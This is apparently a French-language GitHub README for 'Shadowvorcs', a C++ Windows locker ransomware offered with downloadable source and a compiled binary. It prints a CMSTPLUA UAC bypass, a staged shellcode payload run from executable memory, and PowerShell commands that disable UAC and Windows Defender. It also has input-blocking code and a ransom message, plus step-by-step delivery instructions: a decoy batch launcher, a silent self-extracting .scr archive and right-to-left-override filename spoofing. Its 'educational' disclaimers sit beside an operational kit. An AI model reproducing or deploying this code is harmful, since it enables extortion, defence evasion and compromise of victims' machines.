<div align="center">

```
 ██████████████████████████████████████████████████████████████████████████████
 █                                                                            █
 █    ██╗███╗   ███╗ ██████╗ ██████╗ ████████╗███████╗██╗                   █
 █    ██║████╗ ████║██╔═══██╗██╔══██╗╚══██╔══╝██╔════╝██║                   █
 █    ██║██╔████╔██║██║   ██║██████╔╝   ██║   █████╗  ██║                   █
 █    ██║██║╚██╔╝██║██║   ██║██╔══██╗   ██║   ██╔══╝  ██║                   █
 █    ██║██║ ╚═╝ ██║╚██████╔╝██║  ██║   ██║   ███████╗███████╗              █
 █    ╚═╝╚═╝     ╚═╝ ╚═════╝ ╚═╝  ╚═╝   ╚═╝   ╚══════╝╚══════╝              █
 █                                                                            █
 █         ·  P R O J E T   S H A D O W V O R C S   v 1 . 0  ·              █
 █                                                                            █
 █   ┌──────────────────────────────────────────────────────────────────┐    █
 █   │  AUTH   ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓  [ 100% ] ✓   │    █
 █   │  LOAD   ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓  [ 100% ] ✓   │    █
 █   │  EXEC   ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓  [ 100% ] ✓   │    █
 █   └──────────────────────────────────────────────────────────────────┘    █
 █                                                                            █
 █              > ACCÈS AUTORISÉ  //  BIENVENUE DANS LE SYSTÈME              █
 █              > OPÉRATEUR : I M O R T E L  // FR                           █
 █                                                                            █
 ██████████████████████████████████████████████████████████████████████████████
```

<br/>

![Language](https://img.shields.io/badge/LANGUAGE-C%2B%2B-red?style=for-the-badge&logo=cplusplus&logoColor=white&labelColor=0d0d0d)
![Platform](https://img.shields.io/badge/PLATFORM-WINDOWS-red?style=for-the-badge&logo=windows&logoColor=white&labelColor=0d0d0d)
![Build](https://img.shields.io/badge/BUILD-g%2B%2B%20MinGW-brightgreen?style=for-the-badge&logo=gnu&logoColor=white&labelColor=0d0d0d)
![Arch](https://img.shields.io/badge/ARCH-x86%20%7C%20x64-red?style=for-the-badge&labelColor=0d0d0d)
![Status](https://img.shields.io/badge/STATUS-OPERATIONAL-brightgreen?style=for-the-badge&labelColor=0d0d0d)
![Author](https://img.shields.io/badge/AUTHOR-IMORTEL-red?style=for-the-badge&labelColor=0d0d0d)
![License](https://img.shields.io/badge/LICENSE-MIT-gray?style=for-the-badge&labelColor=0d0d0d)

</div>

---

## 🗂️ TABLE DES MATIÈRES

```
  ┌─────────────────────────────────────────────────────────────────┐
  │                                                                 │
  │   01  ──  PRÉSENTATION DE SHADOWVORCS                           │
  │   02  ──  APERÇU DU PAYLOAD                                     │
  │   03  ──  ARCHITECTURE DU PROJET                                │
  │   04  ──  TÉLÉCHARGEMENTS                                       │
  │   05  ──  ENVIRONNEMENT & INSTALLATION                          │
  │   06  ──  COMPILATION — GUIDE COMPLET                           │
  │   07  ──  ANALYSE DÉTAILLÉE DU CODE C++                         │
  │   08  ──  BIBLIOTHÈQUES WINDOWS UTILISÉES                       │
  │   09  ──  AUTEUR                                                │
  │                                                                 │
  └─────────────────────────────────────────────────────────────────┘
```

---

## 01 — PRÉSENTATION DE SHADOWVORCS

<div align="center">

```
  ╔═══════════════════════════════════════════════════════════════════╗
  ║                                                                   ║
  ║   ██████╗ ██████╗  ██████╗      ██╗███████╗ ██████╗████████╗    ║
  ║   ██╔══██╗██╔══██╗██╔═══██╗     ██║██╔════╝██╔════╝╚══██╔══╝    ║
  ║   ██████╔╝██████╔╝██║   ██║     ██║█████╗  ██║        ██║       ║
  ║   ██╔═══╝ ██╔══██╗██║   ██║██   ██║██╔══╝  ██║        ██║       ║
  ║   ██║     ██║  ██║╚██████╔╝╚█████╔╝███████╗╚██████╗   ██║       ║
  ║   ╚═╝     ╚═╝  ╚═╝ ╚═════╝  ╚════╝ ╚══════╝ ╚═════╝   ╚═╝       ║
  ║                                                                   ║
  ║   Application Windows native — C++ pur  //  Win32 API            ║
  ║   Compilation : g++ MinGW  //  x86 & x64                         ║
  ║   Aucune dépendance externe — linkage statique disponible         ║
  ║                                                                   ║
  ╚═══════════════════════════════════════════════════════════════════╝
```

</div>

**SHADOWVORCS** un ransomware de type "locker" avec capacités de persistance et d'évasion de défenses. Il est conçu pour prendre le contrôle total d'un système Windows, désactiver ses protectionsest, (possible d'exiger une rançon si code modifié) **Windows native** développée en **C++ pur** utilisant l'API Win32 de Microsoft. Zéro framework, zéro surcouche — uniquement du code système bas niveau.

**Contournement de l'UAC (User Account Control)**

Le malware utilise une vulnérabilité COM spécifique (CMSTPLUA) pour contourner les mécanismes d'élévation de privilèges Windows. Cette technique permet d'exécuter des commandes avec des droits administratifs sans déclencher l'invite UAC standard, rendant l'infection plus discrète.

**Désactivation des protections système**

Une fois les privilèges élevés obtenus, le malware exécute des commandes PowerShell pour :

- Désactiver le contrôle de compte d'utilisateur (UAC)
- Désactiver la protection en temps réel de Windows Defender
- Collecter des informations de configuration réseau

**Blocage des interactions utilisateur**

Une fois activé, le malware intercepte toutes les entrées clavier, empêchant l'utilisateur d'utiliser son système ou de fermer l'application malveillante.

**Exécution de shellcode**

Le programme injecte et exécute du code machine directement en mémoire, ce qui lui permet d'éventuellement télécharger des charges utiles supplémentaires, établir des connexions réseau distantes ou voler des données.

⚠️**TECHNIQUE D'OBFUSCATION, D'EMBALLAGE ET DE STÉGANOGRAPHIE AVEC LE CARACTÈRE RLO**⚠️

**Étape 1** : Vous devez d'abord créer un fichier batch qui servira à exécuter les composants malveillants.
Créez un fichier texte nommé **lance.bat** (clic droit -> Nouveau -> Document texte, puis renommez-le) 
Dans ce fichier, insérez exactement ces deux lignes :
```bash
start "" "imortel.pdf" ou "imortel.png"
start "" "imortels.exe"
```
Ce fichier batch a pour rôle de :

Ouvrir le PDF/PNG (leurre) pour tromper l'utilisateur
Lancer silencieusement l'exécutable malveillant en arrière-plan ou premier plan

**Étape 2** : Création de l'archive SFX auto-extractible.
Sélectionnez les trois fichiers nécessaires :
- **imortel.pdf** ou **imortel.png** (leurre stéganographique)
- **imortel.exe** (le malware réel)
- **lance.bat** (le script de lancement)
Faites un clic droit -> "Ajouter à l'archive..."

Configurez l'archive comme suit :

Nom de l'archive : **Imortel.scr** (l'extension .scr est cruciale car elle s'exécute comme un .exe mais moins suspecte)
Cocher : "Créer une archive SFX" (auto-extractible)
Dans l'onglet "Avancé", cliquez sur "Options SFX..." et configurez ceci :
- **Champ "Exécuter après extraction"** : tapez lance.bat
- **Onglet "Modes"** : choisissez "Masquer tout" (Silent mode) pour exécuter sans interface visible
- **Onglet "Mise à jour"** : choisissez "Écraser tous les fichiers" pour éviter les conflits
- **Onglet "Texte et icône"** : parcourez et sélectionnez l'icône imortel.ico ou autre pour donner une apparence légitime

**Étape 3 : Obfuscation du nom de fichier avec RLO.**
Maintenant, appliquez la technique d'obfuscation avec le caractère Right-to-Left Override RTO (U+202E) :
- Renommez le fichier Imortel.scr en Shadowvofdp.scr
- Insérez le caractère RLO (U+202E) juste avant le "f" de "fdp"
- Le nom de fichier s'affichera alors comme : Shadowvorcs.pdf
- Même manipulation pour .png .jpg ou autre

---

**Fonctionnalités principales :**

- **Prise de contrôle système** - Élévation silencieuse des privilèges et désactivation des défenses
- **Blocage de l'accès** - Interface plein écran non fermable et blocage des entrées clavier
- **Extorsion financière** - Message de rançon avec redirection vers un site de paiement
- **Persistance** - Modifications système pour maintenir l'accès malgré les redémarrages
- **Furtivité** - Utilisation de techniques COM pour éviter la détection par les solutions antivirus

**Mode opératoire :** 

- Exécution initiale (probablement via phishing ou exploit)
- Contournement de l'UAC pour obtenir les droits administratifs
- Désactivation des protections système
- Affichage de l'interface de rançon
- Blocage complet des interactions utilisateur
- Exécution du shellcode pour des actions malveillantes additionnelles

> Programmation **Win32 API** - Rendu graphique via **GDI32** - Architecture **COM / OLE** - Planification système via **TaskSchd** - Compilation **g++ MinGW**

---

## 02 — APERÇU DU PAYLOAD

<div align="center">

```
  ┌──────────────────────────────────────────────────────────────┐
  │                                                              │
  │        ╔════════════════════════════════════════╗           │
  │        ║   IMORTEL — SHADOWVORCS v1.0    _ □ ✕ ║           │
  │        ╠════════════════════════════════════════╣           │
  │        ║                                        ║           │
  │        ║     ██████████████████████████████     ║           │
  │        ║     █                            █     ║           │
  │        ║    █   [ IMORTEL  v 1 . 0 ]       █     ║           │
  │        ║     █                            █     ║           │
  │        ║     █   > SYSTÈME  OPÉRATIONNEL  █     ║           │
  │        ║     █   > AUTEUR   : IMORTEL     █     ║           │
  │        ║    █   > STATUT  : ACTIF  ✓       █     ║           │
  │        ║     █                            █     ║           │
  │        ║     ██████████████████████████████     ║           │
  │        ║                                        ║           │
  │        ╚════════════════════════════════════════╝           │
  │                                                              │
  └──────────────────────────────────────────────────────────────┘
```

</div>

[![Demo — SHADOWVORCS](imortel.png)](https://files.catbox.moe/fuy95p.mp4)

---

## 03 — ARCHITECTURE DU PROJET

```
  ┌─────────────────────────────────────────────────────────────────────┐
  │                                                                     │
  │   📁  IMORTEL/                                                     │
  │   │                                                                 │
  │   ├── 📄  imortel.cpp     ←  Code source principal (C++ Win32)     │
  │   ├── 💻  imortel.exe     ←  Exécutable compilé (Windows x86/x64)  │
  │   ├── 🖼️  imortel.png     ←  Screenshot                            │
  │   ├── 🎨  imortel.ico     ←  Icône de l'application (.ico)         │
  │   ├── 📦  imortel.rar     ←  Archive complète du projet (WinRAR)   │
  │   ├── 📄  imortel.pdf     ←  Leurre stéganographique               │
  │   └── 📖  README.md       ←  Markdown                              │
  │                                                                     │
  └─────────────────────────────────────────────────────────────────────┘
```

---

## 04 — TÉLÉCHARGEMENTS

<div align="center">

```
  ╔══════════════════════════════════════════════════════════════════╗
  ║              > FICHIERS DISPONIBLES AU TÉLÉCHARGEMENT            ║
  ╚══════════════════════════════════════════════════════════════════╝
```

| Fichier | Type | Description | Lien |
|:--------|:----:|:------------|:----:|
| `imortel.cpp` | SOURCE | Code source complet C++ Win32 | [⬇ Télécharger](./imortel.cpp) |
| `imortel.exe` | BINARY | Exécutable Windows compilé | [⬇ Télécharger](./imortel.exe) |
| `imortel.rar` | ARCHIVE | Projet complet empaqueté | [⬇ Télécharger](./imortel.rar) |
| `imortel.pdf` | DOC | Leurre stéganographique PDF | [⬇ Télécharger](./imortel.pdf) |
| `imortel.png` | IMAGE | Screenshot | [👁 Voir](./imortel.png) |
| `imortel.ico` | ICON | Icône d'apparence légitime | [⬇ Télécharger](./imortel.ico) |

</div>

> ⚠️ L'exécutable est fourni à titre éducatif. Toujours exécuter dans un environnement isolé si tu ne connais pas la source.

---

## 05 — ENVIRONNEMENT & INSTALLATION

### Prérequis système

```
  ┌───────────────────────────────────────────────────────────┐
  │   OS           Windows 7 / 8 / 10 / 11 (32 ou 64 bits)    │
  │   Compilateur  g++ (MinGW-w64) ≥ 8.0                      │
  │   IDE          CLion ou Visual Studio Code (recommandé)   │
  │   Shell        PowerShell  /  CMD  /  Git Bash            │
  └───────────────────────────────────────────────────────────┘
```

### Étape 1 — Installer MinGW-w64

Télécharge MinGW-w64 depuis [winlibs.com](https://winlibs.com) ou [MSYS2](https://www.msys2.org), extrais dans `C:\mingw64\`, puis ajoute au PATH :

```
Panneau de configuration
  └── Système
        └── Paramètres système avancés
              └── Variables d'environnement
                    └── PATH → Modifier → Nouveau
                          └── C:\mingw64\bin
```

Vérification dans le terminal :

```bash
g++ --version
```

Résultat attendu :

```
g++ (x86_64-posix-seh-rev0, Built by MinGW-Builds project) 13.x.x
```

### Étape 2 — Extensions VS Code recommandées

```
  C/C++ ─ ms-vscode.cpptools
  C/C++ Extension Pack ─ ms-vscode.cpptools-extension-pack
  Code Runner ─ formulahendry.code-runner
```

### Étape 3 — Se placer dans le bon répertoire

```powershell
cd C:\Users\anon\Desktop\IMORTEL
```

---

## 06 — COMPILATION — GUIDE COMPLET

<div align="center">

```
  ╔══════════════════════════════════════════════════════════════════╗
  ║                   > DEUX VARIANTES DE BUILD                      ║
  ╚══════════════════════════════════════════════════════════════════╝
```

</div>

### ✅ VERSION 1 — x32 · Linkage statique

```bash
g++ -o imortel.exe imortel.cpp -m32 -luser32 -lgdi32 -lshell32 -lwinmm -lole32 -loleaut32 -static
```

```
  ┌─────────────────────┬──────────────────────────────────────────────────────┐
  │  FLAG               │  RÔLE                                                │
  ├─────────────────────┼──────────────────────────────────────────────────────┤
  │  -o imortel.exe     │  Nom du fichier de sortie                            │
  │  imortel.cpp        │  Fichier source à compiler                           │
  │  -m32               │  Force la compilation en mode 32 bits (x86)          │
  │  -luser32           │  User32  — fenêtres, messages, clavier, souris       │
  │  -lgdi32            │  GDI32   — rendu graphique, formes, texte, bitmap    │
  │  -lshell32          │  Shell32 — ShellExecute, gestion fichiers, icônes    │
  │  -lwinmm            │  WinMM   — son, timers multimédias                   │
  │  -lole32            │  OLE32   — COM, interfaces objets                    │
  │  -loleaut32         │  OleAut32 — automatisation OLE, VARIANT, BSTR        │
  │  -static            │  Intègre les runtimes → exe standalone sans DLL      │
  └─────────────────────┴──────────────────────────────────────────────────────┘
```

### ✅ VERSION 2 — x64 · Task Scheduler (Recommandé)

```bash
g++ imortel.cpp -o imortel.exe -luser32 -lgdi32 -lshell32 -lwinmm -lole32 -loleaut32 -ltaskschd
```

```
  ┌─────────────────────┬──────────────────────────────────────────────────────┐
  │  FLAG               │  RÔLE                                                │
  ├─────────────────────┼──────────────────────────────────────────────────────┤
  │  -ltaskschd         │  TaskSchd — Windows Task Scheduler via COM           │
  │                     │  (ITaskService, ITaskFolder, IRegisteredTask)        │
  │  (sans -m32)        │  Compilation en 64 bits (défaut MinGW-w64)           │
  │  (sans -static)     │  Linkage dynamique — exe plus léger                  │
  └─────────────────────┴──────────────────────────────────────────────────────┘
```

---

## 07 — ANALYSE DÉTAILLÉE DU CODE C++

<div align="center">

```
  ╔══════════════════════════════════════════════════════════════════════╗
  ║                                                                      ║
  ║              > CODE SOURCE  //  imortel.cpp                          ║
  ║              > DÉCOMPOSITION COMPLÈTE — SECTION PAR SECTION          ║
  ║              > [⚠️ À TITRE ÉDUCATIF UNIQUEMENT ⚠️]                  ║
  ║                                                                      ║
  ╚══════════════════════════════════════════════════════════════════════╝
```

</div>

### Structure générale

```
  imortel.cpp
  │
  ├── [BLOC 01]  INCLUDES & HEADERS
  ├── [BLOC 02]  CONSTANTES & MACROS
  ├── [BLOC 03]  DÉCLARATIONS GLOBALES
  ├── [BLOC 04]  WinMain() — point d'entrée
  ├── [BLOC 05]  RegisterClassEx() — enregistrement fenêtre
  ├── [BLOC 06]  CreateWindowEx() — création fenêtre
  ├── [BLOC 07]  GetMessage() — boucle de messages
  ├── [BLOC 08]  WindowProc() — gestionnaire d'événements
  ├── [BLOC 09]  GDI / Rendu graphique
  └── [BLOC 10]  Fonctions utilitaires / logique métier
```

---

### ▸ BLOC 01 — INCLUDES & HEADERS

> ❗**Ce code est fourni strictement à des fins pédagogiques et d’analyse technique**

```cpp
// ============================================================
//  BLOC 01 — INCLUDES & HEADERS
//  Déclare toutes les bibliothèques système utilisées
// ============================================================

#include <windows.h>
#include <iostream>
#include <thread>
#include <string>
#include <sstream>
#include <vector>
#include <ctime>
#include <cstdlib>
#include <conio.h>
#include <comdef.h>
#include <objbase.h>
```

> **Ces inclusions permettent d'utiliser** `windows.h` pour les fonctions API Windows et la manipulation du système, `iostream` pour les entrées/sorties standard, `thread` pour la création de threads en exécution parallèle, `string` et sstream pour la manipulation de chaînes de caractères, `vector` pour les conteneurs dynamiques, `ctime` et `cstdlib` pour les fonctions temporelles et utilitaires, `conio.h` pour les entrées/sorties console, ainsi que `comdef.h` et `objbase.h` pour le support COM pour le **bypass UAC**.

---

### ▸ BLOC 02 — DIRECTIVES DE LIAISON COM

> ❗**Ce code est fourni strictement à des fins pédagogiques et d’analyse technique**

```cpp
// ============================================================
//  BLOC 02 — DIRECTIVES DE LIAISON COM
//  Liaison automatique COM
// ============================================================

#pragma comment(lib, "ole32.lib")
#pragma comment(lib, "oleaut32.lib")
```

> **Ces directives** `#pragma` indiquent au compilateur de lier automatiquement les bibliothèques COM `ole32.lib` et `oleaut32.lib` nécessaires à l’interaction avec les objets COM Windows.

---

### ▸ BLOC 03 — DÉFINITIONS COM POUR LE BYPASS UAC

> ❗**Ce code est fourni strictement à des fins pédagogiques et d’analyse technique**

```cpp
// ============================================================
//  BLOC 03 — DÉFINITIONS COM POUR LE BYPASS UAC
//  Contournement de permissions, payload exécuté en admin
// ============================================================

const CLSID CLSID_CMSTPLUA = { 0x3E5FC7F9, 0x9A51, 0x4367, { 0x90, 0x63, 0xA1, 0x20, 0x24, 0x4F, 0xBE, 0xC7 } };
const IID IID_ICMLuaUtil = { 0x6EDD6D74, 0xC007, 0x4E75, { 0xB7, 0x6A, 0xE5, 0x74, 0x09, 0x95, 0xE2, 0x4C } };

typedef interface ICMLuaUtil ICMLuaUtil;
typedef struct ICMLuaUtilVtbl {
    BEGIN_INTERFACE
    HRESULT (STDMETHODCALLTYPE *QueryInterface)(ICMLuaUtil*, REFIID, void**);
    ULONG   (STDMETHODCALLTYPE *AddRef)(ICMLuaUtil*);
    ULONG   (STDMETHODCALLTYPE *Release)(ICMLuaUtil*);
    HRESULT (STDMETHODCALLTYPE *Method1)(ICMLuaUtil*);
    HRESULT (STDMETHODCALLTYPE *Method2)(ICMLuaUtil*);
    HRESULT (STDMETHODCALLTYPE *Method3)(ICMLuaUtil*);
    HRESULT (STDMETHODCALLTYPE *Method4)(ICMLuaUtil*);
    HRESULT (STDMETHODCALLTYPE *Method5)(ICMLuaUtil*);
    HRESULT (STDMETHODCALLTYPE *Method6)(ICMLuaUtil*);
    HRESULT (STDMETHODCALLTYPE *ShellExec)(ICMLuaUtil*, LPCWSTR, LPCWSTR, LPCWSTR, LPCWSTR, int);
    END_INTERFACE
} ICMLuaUtilVtbl;
struct ICMLuaUtil {
    ICMLuaUtilVtbl *lpVtbl;
};
```

> **Ces constantes** définissent les identifiants COM pour l'interface CMSTPLUA, qui est utilisée pour contourner le contrôle de compte d'utilisateur `UAC` de Windows.
> **Cette structure** définit l'interface virtuelle pour l'objet `COM CMSTPLUA`, permettant d'appeler ses méthodes, notamment `ShellExec` qui est utilisée pour exécuter des commandes avec des privilèges élevés.
---

### ▸ BLOC 04 — FONCTION DE BYPASS UAC

> ❗**Ce code est fourni strictement à des fins pédagogiques et d’analyse technique**

```cpp
// ============================================================
//  BLOC 04 — WinMain() — FONCTION DE BYPASS UAC
//  N’affiche pas la fenêtre de confirmation de Windows
// ============================================================

bool BypassUAC_CMSTPLUA(const wchar_t* command, const wchar_t* parameters) {
    HRESULT hr = CoInitializeEx(NULL, COINIT_APARTMENTTHREADED);
    if (FAILED(hr)) return false;

    ICMLuaUtil* pLuaUtil = NULL;
    hr = CoCreateInstance(CLSID_CMSTPLUA, NULL, CLSCTX_LOCAL_SERVER, IID_ICMLuaUtil, (void**)&pLuaUtil);
    if (FAILED(hr) || !pLuaUtil) {
        CoUninitialize();
        return false;
    }

    hr = pLuaUtil->lpVtbl->ShellExec(pLuaUtil, command, parameters, NULL, NULL, SW_SHOWNORMAL);
    pLuaUtil->lpVtbl->Release(pLuaUtil);
    CoUninitialize();

    return SUCCEEDED(hr);
}
```

> **Cette fonction** initialise la bibliothèque COM, crée une instance de l’objet CMSTPLUA, utilise la méthode `ShellExec` pour exécuter une commande avec élévation de privilèges, libère les ressources COM et retourne true si l’exécution a réussi.

---

### ▸ BLOC 05 — SHELLCODE MALVEILLANT

> ❗**Ce code est fourni strictement à des fins pédagogiques et d’analyse technique**

```cpp
// ============================================================
//  BLOC 05 — SHELLCODE MALVEILLANT
//  Code dangereux conçu pour être injecté et exécuté
// ============================================================

unsigned char shellcode[] =
"\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b\x50\x30"
"\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff"
"\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2\xf2\x52"
"\x57\x8b\x52\x10\x8b\x4a\x3c\x8b\x4c\x11\x78\xe3\x52\x0f\xb7"
"\x4a\x18\x8b\x52\x20\x01\xd0\x8b\x48\x1c\x8b\x58\x3c\x01\xd3"
"\xe3\x3c\x49\x8b\x34\x8b\x01\xd6\x31\xff\xac\xc1\xcf\x0d\x01"
"\xc7\x38\xe0\x75\xf6\x03\x7d\xf8\x3b\x7d\x24\x75\xe4\x58\x8b"
"\x58\x24\x01\xd3\x66\x8b\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04"
"\x8b\x01\xd0\x89\x44\x24\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0"
"\x58\x5f\x5a\x8b\x12\xe9\x57\xff\xff\xff\x5d\x68\x33\x32\x00"
"\x00\x68\x77\x73\x32\x5f\x54\x68\x4c\x77\x26\x07\xff\xd5\xb8"
"\x90\x01\x00\x00\x29\xc4\x54\x50\x68\x2e\x65\x78\x65\x68\xff"
"\xff\xff\xff\x57\x50\x50\x50\x40\x50\x40\x50\x68\xea\x0f\xdf"
"\xe0\xff\xd5\x97\x6a\x05\x68\xc0\xa8\x00\x01\x6a\x02\x8b\x36"
"\x6a\x40\x68\x00\x10\x00\x00\x56\x6a\x00\x68\x58\xa4\x53\xe5"
"\xff\xd5\x6a\x00\x6a\x04\x56\x57\x68\x02\x00\x11\x5c\x89\xe6"
"\x5d\x5f\x5e\x50\xff\xd5";
```

> **Ce shellcode** contient du code machine `binaire` qui sera exécuté directement en mémoire et d'exécution de programme (dropper) conçu pour des attaques de type `staged payload`.

---

### ▸ BLOC 06 — FONCTION D'EXÉCUTION DU SHELLCODE

> ❗**Ce code est fourni strictement à des fins pédagogiques et d’analyse technique**

```cpp
// ============================================================
//  BLOC 06 — FONCTION D'EXÉCUTION DU SHELLCODE
//  Exécution du shellcode en mémoire RAM
// ============================================================

void executeShellcode() {
    void* exec = VirtualAlloc(0, sizeof(shellcode), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    memcpy(exec, shellcode, sizeof(shellcode));
    ((void(*)())exec)();
}
```

> **Cette fonction** alloue de la mémoire exécutable avec `VirtualAlloc`, copie le shellcode dans cette mémoire et exécute le shellcode en appelant le point d’entrée.

---

### ▸ BLOC 07 — FONCTIONS D'AFFICHAGE RANSOMWARE (Optionnel)

> ❗**Ce code est fourni strictement à des fins pédagogiques et d’analyse technique**

> ⚠️J’ai volontairement fourni seulement une partie (~40%) de ce code pour des raisons de sécurité.

```cpp
// ============================================================
//  BLOC 07 — FONCTIONS D'AFFICHAGE RANSOMWARE
//  Extorsion, phishing et infection
// ============================================================

void displayMatrixEffect() {
    std::string cmd = "python -c \"import random, time, sys; chars = '0123456789abcdefABCDEF!@#$%^&*()'; while True: sys.stdout.write(random.choice(chars)); sys.stdout.flush(); time.sleep(0.05)\"";
    std::thread matrixThread([cmd]() { std::system(cmd.c_str()); });
    matrixThread.detach();
}

void displayGlitchEffect() {
    std::ostringstream oss;
    oss << "RANCON RANSOM!!!\n\n"
        "VOTRE SYSTEME EST ENLEVE!\n\n"
        "PASSEZ A LA PAGE: https://imortel.fr\n\n"
        "PRESSIONEZ UNE TASTE POUR DECOUPER!\n\n"
        "GLITCH & MATRICE EN COURS...\n";
    std::string text = oss.str();
    for (int i = 0; i < 100; ++i) {
        std::cout << "\r" << text << std::flush;
        std::this_thread::sleep_for(std::chrono::milliseconds(100));
    }
}
```

```
[OUVERTURE FENÊTRE CONSOLE]
     (Terminal Windows)
              ↓
[EXÉCUTION IMMÉDIATE DES DEUX EFFETS EN PARALLÈLE]
              ↓
┌──────────────────────────────┬──────────────────────────────────┐
│          EFFET 1             │             EFFET 2              │
│        TYPE "MATRICE"        │        MESSAGE "GLITCH"          │
├──────────────────────────────┼──────────────────────────────────┤
│ • Défilement continu de      │ • Affichage du message           │
│   caractères aléatoires      │   "RANSON RANSOM !!"             │
│   (0, 1, A, @, #, etc.)      │                                  │
│                              │ • Clignotement rapide            │
│ • Animation permanente       │                                  │
│   sans interruption          │ • Superposition au flux Matrix   │
│                              │                                  │
│                              │ • Durée limitée (10 secondes)    │
└──────────────────────────────┴──────────────────────────────────┘
```

> **Ce ransomware** est une prise d'otages numérique, après avoir tout chiffré, le programme affiche un message sur l'écran. Ce message informe que les fichiers sont en `otages` et donne une instruction de paiement en `cryptomonnaie`.

---

### ▸ BLOC 08 — INTERCEPTION NEUTRALISÉE DES ENTRÉES

> ❗**Ce code est fourni strictement à des fins pédagogiques et d’analyse technique**

```cpp
// ============================================================
//  BLOC 08 — FONCTION DE BLOCAGE DES ENTRÉES
//  Fonction de blocage des frappes du clavier
// ============================================================

void blockInput() {
    while (true) {
        if (_kbhit()) _getch();
        std::this_thread::sleep_for(std::chrono::milliseconds(100));
    }
}
```

> **Cette fonction** crée une boucle infinie qui `intercepte` et supprime toutes les frappes de clavier, empêchant l'utilisateur d'interagir avec le système.

---

### ▸ BLOC 09 — PRISE DE CONTRÔLE SYSTÈME

> ❗**Ce code est fourni strictement à des fins pédagogiques et d’analyse technique**

```cpp
// ============================================================
//  BLOC 09 — PRISE DE CONTRÔLE SYSTÈME
//  Élévation de privilèges et exécution de commandes système
// ============================================================

void openBrowser() {
    ShellExecuteW(NULL, L"open", L"https://imortel.fr", NULL, NULL, SW_SHOWNORMAL);
}

void openPowerShellWithCommands() {
    const wchar_t* command = L"powershell.exe";
    const wchar_t* params = L"-NoExit -Command \"Write-Host 'Mode administrateur actif' -ForegroundColor Green; Write-Host '=== Désactivation UAC ===' -ForegroundColor Yellow; reg add 'HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System' /v ConsentPromptBehaviorAdmin /t REG_DWORD /d 0 /f; Write-Host '=== Désactivation Defender (temps réel) ===' -ForegroundColor Yellow; Set-MpPreference -DisableRealtimeMonitoring $true; Write-Host '=== Informations réseau ===' -ForegroundColor Yellow; ipconfig /all; Write-Host 'Toutes les commandes ont été exécutées.' -ForegroundColor Green\"";

    if (BypassUAC_CMSTPLUA(command, params)) {
        return;
    }

    ShellExecuteW(NULL, L"runas", L"powershell.exe", params, NULL, SW_SHOWNORMAL);
}
```

```

[EXÉCUTION DU PROGRAMME]
           ↓
 ┌───────────────────────────────┐
 │     OUVERTURE NAVIGATEUR      │
 │  → Accès à https://imortel.fr │
 └───────────────────────────────┘
           ↓
 ┌───────────────────────────────┐
 │ LANCEMENT DE POWERSHELL ADMIN │
 └───────────────────────────────┘
           ↓
 ┌───────────────────────────────┐
 │      ÉLÉVATION (ADMIN)        │
 │  → Bypass UAC / "runas"       │
 └───────────────────────────────┘
           ↓
 ┌───────────────────────────────────────────────┐
 │         EXÉCUTION DES COMMANDES AUTO          │
 ├───────────────────────────────────────────────┤
 │ • Messages affichés dans la console           │
 │ • Modification / Désactivation UAC            │
 │ • Désactivation Windows Defender              │
 │ • Affichage des informations réseau           │
 └───────────────────────────────────────────────┘
```

> **Conçu pour compromettre sérieusement la sécurité Windows en deux étapes principales.** La fonction `openBrowser()` force l'ouverture du navigateur web par défaut de la victime sur l'adresse de mon site `(https://imortel.fr`. Ensuite, la fonction `openPowerShellWithCommands()` est la plus dangereuse : elle exécute une série de commandes PowerShell avec les droits d'administrateur. Pour y parvenir, elle utilise d'abord une technique de contournement du Contrôle de compte d'utilisateur (UAC) via `BypassUAC_CMSTPLUA`. Une fois les droits obtenus, le script exécute des commandes critiques que j'ai mise dans le scrip : il ***désactive l'UAC*** pour autoriser les futures exécutions sans confirmation de manière sûre à 100%, il ***désactive la protection en temps réel de Windows Defender*** pour rendre la machine invisible aux antivirus, puis j’ai rajouté la fameuse petite commande basique bonus qui affiche les informations de configuration réseau avec un `ipconfig /all` pour cartographier le réseau de la victime (possible d’effectuer l’envoi de ces informations réseau vers un serveur distant). ***En résumé, ce code peut être entièrement personnalisé et transformer en un système sans défense et vulnérable.***

---

### ▸ BLOC 10 — FONCTIONS UTILITAIRES

> 📌 **Remplace le code ci-dessous par tes vraies fonctions utilitaires**

```cpp
// ============================================================
//  BLOC 10 — FONCTIONS UTILITAIRES / LOGIQUE MÉTIER
//  Fonctions auxiliaires appelées depuis WindowProc ou WinMain
// ============================================================

// ── Ouvre un fichier avec l'application par défaut ──────────
void OpenFile(LPCTSTR szPath) {
    ShellExecute(
        NULL,           // Fenêtre parente
        TEXT("open"),   // Verbe : "open", "runas", "print"
        szPath,         // Chemin du fichier
        NULL,           // Paramètres (NULL = aucun)
        NULL,           // Répertoire de travail
        SW_SHOWNORMAL   // Mode d'affichage
    );
}

// ── Affiche une boîte de dialogue d'erreur ──────────────────
void ShowError(LPCTSTR szMsg) {
    MessageBox(
        g_hwnd,
        szMsg,
        TEXT("IMORTEL — Erreur"),
        MB_ICONERROR | MB_OK
    );
}

// ── Joue un son système ─────────────────────────────────────
void PlayBeep(DWORD dwFreq, DWORD dwDuration) {
    Beep(dwFreq, dwDuration);   // Fréquence Hz, durée ms
}
```

> **Explication à remplacer** — `ShellExecute` est la fonction la plus polyvalente de `shell32` : elle ouvre n'importe quel fichier avec l'application associée par Windows (comme un double-clic). Le verbe `"runas"` permet de demander une élévation UAC. `MessageBox` est la boîte de dialogue synchrone la plus simple — elle bloque le thread jusqu'à ce que l'utilisateur clique.

---

## 08 — BIBLIOTHÈQUES WINDOWS UTILISÉES

```
  ┌──────────────────────────────────────────────────────────────────────┐
